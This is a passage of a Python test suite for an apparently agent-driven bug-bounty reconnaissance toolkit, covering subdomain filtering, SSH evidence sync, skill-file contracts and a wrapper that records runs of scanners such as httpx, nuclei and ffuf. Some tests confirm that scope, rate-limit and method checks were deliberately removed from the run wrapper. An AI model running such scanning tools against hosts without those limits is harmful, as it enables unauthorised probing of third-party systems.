        original = self.brief.subprocess.run
        self.brief.subprocess.run = lambda *args, **kwargs: status
        try:
            state = self.brief.monitor_resume_state(Path("targets/acme"))
        finally:
            self.brief.subprocess.run = original
        self.assertEqual({"pending": 3, "quarantined": 2, "recent_failure": True}, state)

    def test_monitor_quiet_state_adds_no_resume_noise(self):
        import types
        status = types.SimpleNamespace(
            returncode=0,
            stdout=("# monitor — acme\n"
                    "  snapshots   7 good · 0 quarantined (.partial)\n"
                    "  pending     0 unreviewed delta block(s)\n"),
            stderr="",
        )
        original = self.brief.subprocess.run
        self.brief.subprocess.run = lambda *args, **kwargs: status
        try:
            state = self.brief.monitor_resume_state(Path("targets/acme"))
        finally:
            self.brief.subprocess.run = original
        self.assertIsNone(state)

    def test_monitor_timeout_is_unknown_not_a_false_quiet_state(self):
        original = self.brief.subprocess.run

        def time_out(*_args, **_kwargs):
            raise self.brief.subprocess.TimeoutExpired("monitor status", 20)

        self.brief.subprocess.run = time_out
        try:
            state = self.brief.monitor_resume_state(Path("targets/acme"))
        finally:
            self.brief.subprocess.run = original
        self.assertEqual({"check_error": "status check timed out"}, state)

    def test_resume_output_routes_to_the_current_slug_not_a_ghost(self):
        """End-to-end on the rendered resume: the load set must name the REAL skill file, carry no
        `NN-<slug> playbook` string, and make no false 'already loaded' claim. Driven through the
        resume() renderer with TARGETS patched, so it is hermetic and the output is non-empty —
        an absence-only assertion on empty output would pass for the wrong reason."""
        import tempfile, io, contextlib
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp) / "acme"
            (t / "recon").mkdir(parents=True)
            (t / "index.md").write_text("# acme\n")
            (t / "scope.md").write_text("### In scope\n- `*.acme.com`\n")
            (t / "runs.tsv").write_text(
                "run_id\tphase\tstatus\tselector\tresult\tlimitations\tresume_from\tscope_sha\tsources\tdate\n"
                "R-001\t02-subdomain-enumeration\trunning\tall\t\t\tmid-enum\t\t\t2026-01-01\n")
            orig = self.brief.TARGETS
            original_monitor = self.brief.monitor_resume_state
            self.brief.TARGETS = Path(tmp)
            self.brief.monitor_resume_state = lambda _target: {
                "pending": 2, "quarantined": 1, "recent_failure": False}
            try:
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    rc = self.brief.resume("acme")
                out = buf.getvalue()
            finally:
                self.brief.TARGETS = orig
                self.brief.monitor_resume_state = original_monitor
        self.assertEqual(0, rc)
        self.assertIn("Load these", out)                 # the block rendered — not empty
        self.assertIn("skills/subdomain-enumeration.md", out,   # POSITIVE: real slug
                      f"resume did not route to the current skill:\n{out}")
        self.assertNotRegex(out, r"\b\d\d-[a-z-]+ playbook",
                            "resume still emits a numbered playbook name")
        self.assertNotIn("already in your session context", out,
                         "resume must not claim it loaded something it never did")
        self.assertIn("2 unreviewed delta block", out)
        self.assertIn("1 run(s) were quarantined", out)


class VpsTransportTests(unittest.TestCase):
    """`vps-sync.py status` once reported 'no remote directory' for a directory that provably
    existed, because it ran the probe with check=False, discarded stderr, and read empty stdout
    as 'missing'. That collapses four states — unreachable, auth-rejected, absent, present — into
    one, and violates fail-loud. The classifier must keep them apart."""

    @classmethod
    def setUpClass(cls):
        cls.vs = load_tool("vps-sync")

    class _R:
        def __init__(self, rc, err):
            self.returncode, self.stderr, self.stdout = rc, err, ""

    def test_connected_is_not_an_error(self):
        self.assertIsNone(self.vs.ssh_transport_error(self._R(0, "")))

    def test_auth_rejection_is_named(self):
        msg = self.vs.ssh_transport_error(self._R(255, "Permission denied (publickey)."))
        self.assertIn("AUTH", msg)

    def test_connection_failures_are_unreachable_not_absent(self):
        for err in ("ssh: connect to host x port 22: Connection refused",
                    "ssh: Could not resolve hostname x",
                    "Operation timed out"):
            with self.subTest(err=err):
                msg = self.vs.ssh_transport_error(self._R(255, err))
                self.assertIn("UNREACHABLE", msg)
                # the whole point: this must never read as 'nothing has run'
                self.assertNotIn("MISSING", msg)

    def test_unknown_nonzero_still_fails_loud(self):
        msg = self.vs.ssh_transport_error(self._R(3, "something odd"))
        self.assertTrue(msg and "SSH FAILED" in msg)

    def test_pull_retrieves_evidence_even_when_recon_is_absent(self):
        """Found by running it for real on the VPS: cmd_pull die()'d when recon/ was absent, before
        reaching the evidence pull — stranding execution records on the disposable box, the exact
        durability hole the pull exists to close. A target may have run commands and produced no
        recon extract. Recon-absent must skip the recon pull and STILL fetch logs/exec."""
        import tempfile
        from unittest import mock
        vs = self.vs
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp) / "acme"
            (t / "index.md").parent.mkdir(parents=True, exist_ok=True)
            (t / "index.md").write_text("# acme\n")
            calls = {"evidence": False}

            def fake_remote_result(cmd):
                # both existence checks go through remote_result now; connection is fine (rc 0)
                class R:
                    returncode = 0
                    stderr = ""
                    stdout = ("no\nDONE\n" if "recon" in cmd
                              else "yes\nDONE\n" if "logs/exec" in cmd else "DONE\n")
                if "logs/exec" in cmd:
                    calls["evidence"] = True
                return R()

            def fake_rsync(cmd, *a, **k):
                class R:
                    returncode, stdout, stderr = 0, "record.json\n", ""
                return R()

            with mock.patch.object(vs, "need_rsync", lambda: None), \
                 mock.patch.object(vs, "local_target", lambda x: t), \
                 mock.patch.object(vs, "workdir", lambda: "~/targets"), \
                 mock.patch.object(vs, "ssh_prefix", lambda: ["ssh", "-p", "22", "h"]), \
                 mock.patch.object(vs, "remote_result", fake_remote_result), \
                 mock.patch.object(vs.subprocess, "run", fake_rsync):
                args = mock.Mock(target=str(t), max_list=262144, dry_run=False)
                import io, contextlib
                with contextlib.redirect_stdout(io.StringIO()):
                    rc = vs.cmd_pull(args)   # must NOT raise SystemExit
        self.assertEqual(0, rc)
        self.assertTrue(calls["evidence"], "evidence pull must run even when recon/ is absent")

    def test_pull_fails_loud_when_ssh_is_unreachable(self):
        """The reviewer saw `pull` exit 0 with 'evidence records: none' when SSH was down in a
        sandbox — a confident false zero. An unreachable VPS must raise, not report emptiness."""
        import tempfile
        from unittest import mock
        vs = self.vs

        class DeadConn:
            returncode, stdout, stderr = 255, "", "ssh: connect to host h port 22: Connection refused"

        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp) / "acme"
            t.mkdir(parents=True)
            (t / "index.md").write_text("# acme\n")
            with mock.patch.object(vs, "need_rsync", lambda: None), \
                 mock.patch.object(vs, "local_target", lambda x: t), \
                 mock.patch.object(vs, "workdir", lambda: "~/targets"), \
                 mock.patch.object(vs, "remote_result", lambda cmd: DeadConn()):
                args = mock.Mock(target=str(t), max_list=262144, dry_run=False)
                import io, contextlib
                with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as cm:
                    vs.cmd_pull(args)
        self.assertEqual(2, cm.exception.code, "an unreachable VPS is exit 2, not a silent zero")


class WildcardCheckTests(unittest.TestCase):
    """A wildcard parent makes every child a phantom host. The producer's own filter is not
    enough: on a real run puredns reported 11 roots, left 21 artifacts in its output, and missed
    4 wildcard parents outright."""

    @classmethod
    def setUpClass(cls):
        cls.wc = load_tool("wildcard-check")

    def test_parent_of_strips_one_label(self):
        self.assertEqual("t.example.com", self.wc.parent_of("admin2.t.example.com"))

    def test_apex_has_no_parent_to_test(self):
        """`example.com` must not yield `com` — that would test the TLD for wildcards."""
        self.assertEqual("", self.wc.parent_of("example.com"))

    def test_children_of_a_wildcard_parent_are_dropped(self):
        hosts = ["admin2.t.example.com", "api.mail.example.com", "x.t.example.com"]
        clean, dropped = self.wc.classify(hosts, {"t.example.com"})
        self.assertEqual(["api.mail.example.com"], clean)
        self.assertEqual(["admin2.t.example.com", "x.t.example.com"], dropped)

    def test_nothing_dropped_when_no_wildcards(self):
        hosts = ["a.mail.example.com", "b.mail.example.com"]
        clean, dropped = self.wc.classify(hosts, set())
        self.assertEqual(hosts, clean)
        self.assertEqual([], dropped)

    def test_two_distinct_controls_are_used(self):
        """One control could collide with a real host and condemn a legitimate parent."""
        self.assertEqual(2, len(set(self.wc.CONTROLS)))

    def test_wildcard_requires_both_controls_to_answer(self):
        calls = []

        def fake(name, resolver, timeout):
            calls.append(name)
            return "1.2.3.4" if name.startswith(self.wc.CONTROLS[0]) else ""

        original = self.wc.resolve
        self.wc.resolve = fake
        try:
            self.assertFalse(self.wc.is_wildcard("mail.example.com", "1.1.1.1", 3))
        finally:
            self.wc.resolve = original


# ─────────────────────────────────────────────────────────────────────────────
# REMOVED: RunsTableSyncTests — index.md no longer mirrors runs.tsv.
#
# The mirror existed because index.md advertised a table "appended by kb.py run"
# that nothing appended, so it silently went stale. The fix at the time was to
# regenerate it; the better fix is not to have a second copy. `runs.tsv` is the
# authority and `kb.py runs <t>` reads it directly.
#
# index.md holds decisions and state now — 12,370 bytes down to 5,859 on a live
# target, with 48% of it having been regenerated duplicates of files that
# already existed.
# ─────────────────────────────────────────────────────────────────────────────


class InputRoleTests(unittest.TestCase):
    """Phase inputs are declared as roles resolved through one table.

    The bug this replaced: `18-host-correlation-and-clustering` declared bare `technologies.md`,
    `ips-asn.md`, `dns.md`, `js-findings.md`, `endpoints.md` with the `recon/` prefix missing, so
    preflight looked for `targets/<t>/technologies.md`, correctly reported `missing`, and blocked
    a phase whose inputs all existed. A path written into 23 playbooks rots in 23 places.
    """

    @classmethod
    def setUpClass(cls):
        cls.roles = load_tool("roles")
        cls.pf = load_tool("preflight")

    def test_table_parses_and_is_not_empty(self):
        table = self.roles.load()
        self.assertGreater(len(table), 20, "the role table should cover the whole brain")
        for role, (path, _produced) in table.items():
            self.assertTrue(role.startswith("@"), f"{role} must start with @")
            self.assertFalse(path.startswith("/"), f"{role} -> {path} must be target-relative")

    def test_roles_resolve_to_the_paths_the_literals_used_to_name(self):
        self.assertEqual(self.roles.resolve("@hosts.all"), "recon/subdomains.txt")
        self.assertEqual(self.roles.resolve("@hosts.resolved"), "recon/resolved.txt")
        self.assertEqual(self.roles.resolve("@hosts.live"), "recon/live-hosts.txt")
        self.assertEqual(self.roles.resolve("@net.ips"), "recon/ips.txt")

    def test_an_unknown_role_is_loud_not_skipped(self):
        self.assertIsNone(self.roles.resolve("@nope.nothing"))
        msg = self.roles.unknown("@hosts.resolvd")
        self.assertIn("unknown input role", msg)
        self.assertIn("@hosts.resolved", msg, "it should suggest the near miss")

    def test_declared_inputs_resolves_roles(self):
        text = "## Inputs\n- `@hosts.resolved` (from `live-host-validation`).\n- `@net.ports` if it ran.\n"
        got = {role: (path, req) for role, path, req, _g in self.pf.declared_inputs(text)}
        self.assertEqual("recon/resolved.txt", got["@hosts.resolved"][0])
        self.assertTrue(got["@hosts.resolved"][1], "primary role must be required")
        self.assertEqual("recon/ports.md", got["@net.ports"][0])
        self.assertFalse(got["@net.ports"][1], "an 'if it ran' bullet stays advisory")

    def test_an_unknown_role_reaches_check_as_a_sentinel(self):
        text = "## Inputs\n- `@hosts.resolvd` (typo).\n"
        self.assertEqual([("@hosts.resolvd", None, True, False)], self.pf.declared_inputs(text),
                         "a typo'd role must surface, never read as 'no inputs to check'")

    def test_every_role_used_by_every_playbook_exists(self):
        """Repo-wide invariant: no playbook may name a role the table does not define."""
        import re
        table = self.roles.load()
        bad = []
        for pf_file in sorted((ROOT / "skills").glob("*.md")):
            for role in set(re.findall(r"`(@[\w.]+)`", pf_file.read_text(encoding="utf-8"))):
                if role not in table:
                    bad.append(f"{pf_file.name}: {role}")
        self.assertEqual([], bad, f"undefined roles referenced: {bad}")

    def test_no_playbook_input_section_hardcodes_a_recon_path(self):
        """The whole point: a recon artifact is named in the table, not in 23 playbooks."""
        import re
        bad = []
        for pf_file in sorted((ROOT / "skills").glob("*.md")):
            text = pf_file.read_text(encoding="utf-8")
            m = re.search(r"^## Inputs\s*$(.*?)(?=^## )", text, re.M | re.S)
            if not m:
                continue
            for lit in re.findall(r"`(recon/[^`]+)`", m.group(1)):
                bad.append(f"{pf_file.name}: {lit}")
        self.assertEqual([], bad, f"hardcoded recon paths in an Inputs section: {bad}")

    def test_no_playbook_carries_a_stale_numeric_temp_path(self):
        """Renumbering left all seven of these pointing at their OLD phase number."""
        import re
        bad = []
        for pf_file in sorted((ROOT / "skills").glob("*.md")):
            for hit in re.findall(r"/tmp/<t>-\d+-", pf_file.read_text(encoding="utf-8")):
                bad.append(f"{pf_file.name}: {hit}")
        self.assertEqual([], bad, f"phase-numbered temp paths rot on renumber: {bad}")


class PreflightReportsRatherThanRefusesTests(unittest.TestCase):
    """The hunter decides what runs. preflight informs the limitations; it does not veto."""

    @classmethod
    def setUpClass(cls):
        cls.pf = load_tool("preflight")

    def test_missing_inputs_do_not_produce_a_refusal_exit(self):
        import io, contextlib
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"
            (d / "recon").mkdir(parents=True)
            (d / "index.md").write_text("# t\n")
            (d / "scope.md").write_text(
                "## Mechanical allowlist\n### In scope\n- `*.example.com`\n")
            argv = sys.argv
            sys.argv = ["preflight.py", str(d), "host-correlation-and-clustering"]
            try:
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    rc = self.pf.main()
            finally:
                sys.argv = argv
        out = buf.getvalue()
        self.assertNotEqual(2, rc, "a missing input must never be a refusal")
        self.assertIn("MISSING", out, "it must still say loudly what is absent")
        self.assertNotIn("Do not run this phase", out)


class PropertyProducerTests(unittest.TestCase):
    """Every vocabulary token a class rule selects on must have something that EMITS it.

    `role-gated` had no producer anywhere in the workspace, which made
    function-level-authorization unreachable in practice — the class existed, its rule was
    correct, and nothing could ever satisfy it. A vocabulary entry with no producer is a
    silent coverage hole, not a harmless extra row.
    """

    @classmethod
    def setUpClass(cls):
        cls.ih = load_tool("import-http")
        cls.cov = load_tool("coverage")

    def _entry(self, **kw):
        base = {"method": "GET", "url": "https://a.com/x", "req_headers": {}, "res_headers": {},
                "status": 200, "req_ct": "", "res_ct": "", "body": "", "res_body": ""}
        base.update(kw)
        return base

    def test_role_gated_has_a_producer(self):
        e = self._entry(url="https://a.com/api/me",
                        res_body='{"user":"x","permissions":["read"],"isAdmin":false}')
        self.assertIn("role-gated", self.ih.properties_of(e, e["url"], [], []))

    def test_the_five_tier1_properties_are_emitted(self):
        cases = {
            "jwt": self._entry(req_headers={"authorization":
                               "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig"}),
            "bulk-operation": self._entry(method="POST", url="https://a.com/api/bulk/delete",
                                          body='{"ids":[1,2,3]}'),
            "async-job": self._entry(status=202, res_body='{"job_id":"abc"}'),
            "renders-document": self._entry(res_ct="application/pdf"),
            "principal-switch": self._entry(url="https://a.com/admin/impersonate"),
        }
        for prop, e in cases.items():
            with self.subTest(prop=prop):
                self.assertIn(prop, self.ih.properties_of(e, e["url"], [], []))

    def test_response_body_is_actually_captured(self):
        """The producers above read res_body; if the parsers stop populating it they become
        emitters that silently never fire — which is how role-gated got lost."""
        src = (ROOT / "tools" / "import-http.py").read_text(encoding="utf-8")
        self.assertIn('"res_body"', src)
        self.assertEqual(2, src.count('"res_body": '),
                         "both the HAR and Burp parsers must populate res_body")

    def test_no_class_rule_selects_on_a_token_nothing_emits(self):
        """Weaker than 'every token has a producer' — some are assigned by a human reading a
        response. But a token in a class rule that NO producer and NO workflow can assign is a
        dead class, so at minimum the removed ones must be gone."""
        _, known = self.cov.load_signals()
        for gone in ("parses-structured", "ambiguous-framing", "concurrency"):
            self.assertNotIn(gone, known, f"{gone} was removed and must not resurface")


class SkillGraphTests(unittest.TestCase):
    """The dependency graph is derived, so it cannot drift the way the prose one did."""

    @classmethod
    def setUpClass(cls):
        cls.graph = load_tool("graph")

    def test_every_declared_role_has_a_resolvable_producer(self):
        sk, prod = self.graph.skills(), self.graph.producers()
        known, bad = set(sk), []
        for slug, meta in sk.items():
            for role in meta["required"] + meta["optional"]:
                p = prod.get(role)
                if p is None or (p not in known and not self.graph._resolvable(p)):
                    bad.append(f"{slug} -> {role} -> {p}")
        self.assertEqual([], bad, f"unresolvable producers: {bad}")

    def test_no_skill_file_carries_a_phase_number(self):
        """Numeric identity is what drifted. Slugs only, in skills/."""
        import re as _re
        d = ROOT / "skills"
        if not d.is_dir():
            self.skipTest("skills/ not present")
        skip = {"vuln-hunt", "run-flow", "analyse-request", "tech-analysis",
                "ground-a-playbook", "init-target"}
        bad = []
        for f in sorted(d.glob("*.md")):
            if f.stem in skip:      # these still reference the legacy tree; Stage 5 cleans them
                continue
            for m in _re.finditer(r"`(\d{2})-[a-z-]+`|\bphase (\d{1,2})\b",
                                  f.read_text(encoding="utf-8")):
                bad.append(f"{f.name}: {m.group(0)}")
        self.assertEqual([], bad, f"numeric phase identity in skills/: {bad}")


class SkillContractTests(unittest.TestCase):
    """Every file in skills/ obeys one shape, so a reader learns it once.

    These are conformance checks, not style policing. Each one encodes a failure that
    actually happened: a phase that restated the shared loop until nobody read either copy,
    an Inputs section naming a literal path that later moved, and flag lists that went stale
    while still reading as authoritative.
    """

    SECTIONS = ["## Objective", "## Inputs", "## Outputs", "## Exit criteria", "## Next"]
    # Not recon objectives, and deliberately shaped differently: vuln-hunt dispatches over the
    # class library, run-flow bundles several skills under one human decision, analyse-request
    # consumes a pasted request, tech-analysis reasons about a stack, ground-a-playbook is
    # build-time. Holding them to the recon contract would force five jobs into one template.
    NOT_RECON = {"vuln-hunt", "run-flow", "analyse-request", "tech-analysis",
                 "ground-a-playbook", "init-target"}

    @classmethod
    def setUpClass(cls):
        cls.dir = ROOT / "skills"
        cls.files = sorted(p for p in cls.dir.glob("*.md")
                           if not p.name.startswith("_")
                           and p.stem not in cls.NOT_RECON) if cls.dir.is_dir() else []

    def setUp(self):
        if not self.files:
            self.skipTest("skills/ not populated yet")

    def test_required_sections_present_and_ordered(self):
        bad = []
        for f in self.files:
            text = f.read_text(encoding="utf-8")
            at = [text.find(s) for s in self.SECTIONS]
            missing = [s for s, i in zip(self.SECTIONS, at) if i < 0]
            if missing:
                bad.append(f"{f.name}: missing {missing}")
            elif at != sorted(at):
                bad.append(f"{f.name}: sections out of order")
        self.assertEqual([], bad, "\n".join(bad))

    def test_each_skill_points_at_the_shared_method(self):
        """The loop lives in one file. A skill that restates it creates a second copy to drift."""
        bad = [f.name for f in self.files
               if "_recon-method.md" not in f.read_text(encoding="utf-8")]
        self.assertEqual([], bad, f"not pointing at the shared method: {bad}")

    def test_inputs_name_roles_never_literal_paths(self):
        """The whole point of roles: an artifact is named once, in the role table."""
        import re as _re
        bad = []
        for f in self.files:
            m = _re.search(r"^## Inputs\s*$(.*?)(?=^## )", f.read_text(encoding="utf-8"),
                           _re.M | _re.S)
            if not m:
                continue
            for lit in _re.findall(r"`(recon/[^`]+|attack-surface\.md|clusters\.md|"
                                   r"hypotheses\.md|tested\.md)`", m.group(1)):
                bad.append(f"{f.name}: literal path {lit} in Inputs")
        self.assertEqual([], bad, "\n".join(bad))

    def test_no_tool_flag_lists(self):
        """A flag list is `--help` with a shelf life. One skill instructed two httpx flags
        that do not exist in the installed build; every downstream parse would have reported a
        confident zero. The method file owns tool correctness now."""
        import re as _re
        bad = []
        for f in self.files:
            for i, line in enumerate(f.read_text(encoding="utf-8").splitlines(), 1):
                s = line.strip()
                if s.startswith((">", "|", "-", "*", "#")) or "`--help`" in s:
                    continue
                # two or more distinct flags on one line is an invocation, not prose
                if len(set(_re.findall(r"(?<![\w-])-{1,2}[a-z][a-z0-9-]{1,}", s))) >= 2:
                    bad.append(f"{f.name}:{i}: {s[:70]}")
        self.assertEqual([], bad, "flag lists found:\n" + "\n".join(bad))

    def test_recon_skills_do_not_claim_to_emit_properties(self):
        """derive-properties owns the closed vocabulary, so one skill applies it consistently
        and a partially-propertied row can never masquerade as a complete one."""
        bad = []
        for f in self.files:
            # derive-properties writes the rows; attack-surface-prioritization writes the
            # rank and score columns the deriver deliberately leaves empty. Both own @surface,
            # for different columns — properties are facts, rank is judgement.
            if f.stem in ("derive-properties", "analyse-request",
                          "attack-surface-prioritization"):
                continue
            text = f.read_text(encoding="utf-8")
            if "## Outputs" in text:
                out = text.split("## Outputs", 1)[1].split("## ", 1)[0]
                # The invariant is WRITING TO THE SURFACE, not using the English word
                # "property" — "each reset-flow property" is ordinary prose, not a claim.
                writes_surface = "@surface" in out or "attack-surface" in out
                if writes_surface and "derive-properties" not in out:
                    bad.append(f"{f.stem}: Outputs writes @surface without naming the deriver")
        self.assertEqual([], bad, "\n".join(bad))


class RunRecorderTests(unittest.TestCase):
    """run.py records and checks the mechanically provable output contract.

    The one that matters most: success is judged on the ARTIFACT, not on what the tool printed.
    `ffuf -o` can exit 0, print a banner, and leave an empty file — measuring stdout called that
    a success, which is a failure wearing a success code.
    """

    @classmethod
    def setUpClass(cls):
        cls.runner = load_tool("run")

    def _brain(self, root):
        d = pathlib.Path(root) / "t"
        (d / "logs").mkdir(parents=True)
        (d / "index.md").write_text("# t\n")
        return d

    def _invoke(self, d, argv, extra=()):
        import io, contextlib
        saved = sys.argv
        sys.argv = ["run.py", str(d), "--skill", "http-probing", *extra, "--", *argv]
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = self.runner.main()
        finally:
            sys.argv = saved
        return rc, buf.getvalue()

    def test_a_missing_artifact_is_a_failure_wearing_a_success_code(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, out = self._invoke(d, ["echo", "banner text"],
                                   ("--expect-file", "raw/never-written.json"))
            self.assertEqual(1, rc, "exit 0 with no artifact must not read as success")
            self.assertIn("was NOT created", out)

    def test_an_empty_artifact_is_not_no_findings(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            (d / "raw").mkdir()
            (d / "raw" / "empty.json").write_text("")
            rc, out = self._invoke(d, ["echo", "x"], ("--expect-file", "raw/empty.json"))
            self.assertEqual(1, rc)
            self.assertIn("EMPTY", out)

    def test_a_real_artifact_passes_and_is_hashed(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            (d / "raw").mkdir()
            rc, _ = self._invoke(
                d,
                [sys.executable, "-c",
                 "from pathlib import Path; Path('raw/out.json').write_text('{\"a\":1}')"],
                ("--expect-file", "raw/out.json"),
            )
            self.assertEqual(0, rc)
            rec = json.loads(next((d / "logs" / "exec").glob("*.json")).read_text())
            self.assertTrue(rec["artifact"]["exists"])
            self.assertTrue(rec["artifact"]["sha256_16"])
            self.assertTrue(rec["artifact"]["fresh"])

    def test_an_unchanged_artifact_cannot_impersonate_this_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            (d / "raw").mkdir()
            (d / "raw" / "old.json").write_text('{"old":true}')
            rc, out = self._invoke(d, ["echo", "banner"],
                                   ("--expect-file", "raw/old.json"))
            self.assertEqual(1, rc)
            self.assertIn("stale artifact", out)

    def test_bad_jsonl_fails_even_when_nonempty(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, out = self._invoke(d, ["printf", "not-json\\n"],
                                   ("--expect-format", "jsonl"))
            self.assertEqual(1, rc)
            self.assertIn("FAILED contract", out)

    def test_declared_fields_are_checked_on_every_record(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, out = self._invoke(d, ["printf", '{"url":"https://a"}\\n'],
                                   ("--expect-format", "jsonl", "--expect-fields",
                                    "url,status_code"))
            self.assertEqual(1, rc)
            self.assertIn("status_code", out)

    def test_valid_declared_jsonl_is_recorded(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, _ = self._invoke(d, ["printf", '{"url":"https://a","status_code":200}\\n'],
                                  ("--expect-format", "jsonl", "--expect-fields",
                                   "url,status_code"))
            self.assertEqual(0, rc)
            rec = json.loads(next((d / "logs" / "exec").glob("*.json")).read_text())
            self.assertTrue(rec["output_validation"]["ok"])
            self.assertEqual(1, rec["output_validation"]["records"])

    def test_stdout_can_become_a_named_validated_artifact_without_a_shell_wrapper(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, _ = self._invoke(d, ["printf", '{"url":"https://a"}\\n'],
                                  ("--stdout-file", "raw/urls.jsonl",
                                   "--expect-format", "jsonl", "--expect-fields", "url"))
            self.assertEqual(0, rc)
            self.assertEqual('{"url":"https://a"}\n',
                             (d / "raw" / "urls.jsonl").read_text())
            rec = json.loads(next((d / "logs" / "exec").glob("*.json")).read_text())
            self.assertEqual("--stdout-file", rec["artifact"]["source"])
            self.assertTrue(rec["artifact"]["validation"]["ok"])

    def test_stdout_artifact_cannot_overwrite_outside_the_target(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            outside = pathlib.Path(tmp) / "outside.jsonl"
            with self.assertRaises(SystemExit) as stopped:
                self._invoke(d, ["printf", '{}\\n'],
                             ("--stdout-file", str(outside), "--expect-format", "jsonl"))
            self.assertEqual(2, stopped.exception.code)
            self.assertFalse(outside.exists())

    def test_exact_jsluice_resolve_path_failure_is_rejected(self):
        errors = self.runner.invocation_errors(
            ["jsluice", "urls", "-R", "bundle.js", "bundle.js"])
        self.assertEqual(1, len(errors))
        self.assertIn("absolute HTTP(S) base URL", errors[0])

    def test_jsluice_absolute_resolve_base_is_accepted(self):
        self.assertEqual([], self.runner.invocation_errors(
            ["jsluice", "urls", "-R", "https://app.example/static/app.js", "bundle.js"]))

    def test_real_jsluice_url_shape_satisfies_the_built_in_contract(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "urls.jsonl"
            path.write_text(json.dumps({
                "url": "/api/orders?id=7", "queryParams": ["id"], "bodyParams": [],
                "method": "POST", "type": "fetch", "filename": "app.js",
            }) + "\n")
            contract = self.runner.output_contract("jsluice-urls")
            result = self.runner.validate_output(path, contract)
            self.assertTrue(result["ok"], result)

    def test_jsluice_shape_rejects_a_nonempty_but_useless_row(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "urls.jsonl"
            path.write_text('{"filename":"app.js"}\n')
            result = self.runner.validate_output(
                path, self.runner.output_contract("jsluice-urls"))
            self.assertFalse(result["ok"])
            self.assertIn("url", result["error"])

    def test_known_json_tool_output_file_is_inferred(self):
        argv = ["httpx", "-json", "-l", "hosts.txt", "-o", "raw/http.jsonl"]
        self.assertEqual("httpx-jsonl", self.runner.inferred_contract(argv))
        self.assertEqual("raw/http.jsonl", self.runner.inferred_output_file(argv))

    def test_installed_short_json_flags_are_recognised(self):
        cases = {
            "httpx": (["httpx", "-j"], "httpx-jsonl"),
            "dnsx": (["dnsx", "-j"], "dnsx-jsonl"),
            "naabu": (["naabu", "-j"], "naabu-jsonl"),
            "katana": (["katana", "-j"], "katana-jsonl"),
            "nuclei": (["nuclei", "-j"], "nuclei-jsonl"),
            "ffuf": (["ffuf", "-json"], "ffuf-jsonl"),
            "arjun": (["arjun", "-o", "out.json"], "arjun-json"),
        }
        for tool, (argv, contract) in cases.items():
            with self.subTest(tool=tool):
                self.assertEqual(contract, self.runner.inferred_contract(argv))

    def test_nuclei_json_and_jsonl_exports_are_not_conflated(self):
        json_argv = ["nuclei", "-json-export", "raw/findings.json"]
        jsonl_argv = ["nuclei", "-jsonl-export", "raw/findings.jsonl"]
        self.assertEqual("nuclei-json", self.runner.inferred_contract(json_argv))
        self.assertEqual("raw/findings.json", self.runner.inferred_output_file(json_argv))
        self.assertEqual("nuclei-jsonl", self.runner.inferred_contract(jsonl_argv))
        self.assertEqual("raw/findings.jsonl", self.runner.inferred_output_file(jsonl_argv))

    def test_ffuf_output_file_defaults_to_json_contract(self):
        argv = ["ffuf", "-u", "https://t/FUZZ", "-w", "words", "-o", "out.json"]
        self.assertEqual("ffuf-json", self.runner.inferred_contract(argv))

    def test_ffuf_file_contract_wins_over_json_console_mode(self):
        argv = ["ffuf", "-json", "-o", "out.json"]
        self.assertEqual("ffuf-json", self.runner.inferred_contract(argv))

    def test_nuclei_export_contract_wins_over_console_jsonl(self):
        argv = ["nuclei", "-j", "-json-export", "out.json"]
        self.assertEqual("nuclei-json", self.runner.inferred_contract(argv))

    def test_a_timeout_is_recorded_as_a_failure_not_an_empty_result(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            rc, out = self._invoke(d, ["sleep", "5"], ("--timeout", "1"))
            self.assertEqual(2, rc)
            rec = json.loads(next((d / "logs" / "exec").glob("*.json")).read_text())
            self.assertEqual(124, rec["exit"])
            self.assertIn("killed at", rec["exit_note"])

    def test_inputs_are_hashed_so_a_result_can_be_re_derived(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            wl = d / "words.txt"
            wl.write_text("a\nb\n")
            self._invoke(d, ["wc", "-l", "words.txt"])
            rec = json.loads(next((d / "logs" / "exec").glob("*.json")).read_text())
            self.assertEqual(["words.txt"], [i["path"] for i in rec["inputs"]])
            self.assertTrue(rec["inputs"][0]["sha256_16"])

    def test_the_record_carries_no_secret(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp)
            self._invoke(d, ["echo", "-H", "Authorization: Bearer sk-live-abcdef123456"])
            raw = next((d / "logs" / "exec").glob("*.json")).read_text()
            self.assertNotIn("sk-live-abcdef123456", raw)
            self.assertIn("redacted", raw)

    def test_it_no_longer_polices(self):
        """Scope, rate, method and ledger checks are gone by decision, not by accident."""
        src = (ROOT / "tools" / "run.py").read_text(encoding="utf-8")
        code = "\n".join(l for l in src.splitlines() if not l.lstrip().startswith("#"))
        code = code.split('"""', 2)[-1]
        for gone in ("parse_scope", "in_scope", "max_rps", "MUTATING", "check_run_row",
                     "--strict"):
            self.assertNotIn(gone, code, f"{gone} should no longer be in run.py")


class DocumentedCountTests(unittest.TestCase):
    """Counts written into prose drift the moment a file is added, and nothing notices.

    Found by audit: FILEMAP said "Thirty skills" (31), "Twenty-seven programs" (26) and "~56 KB
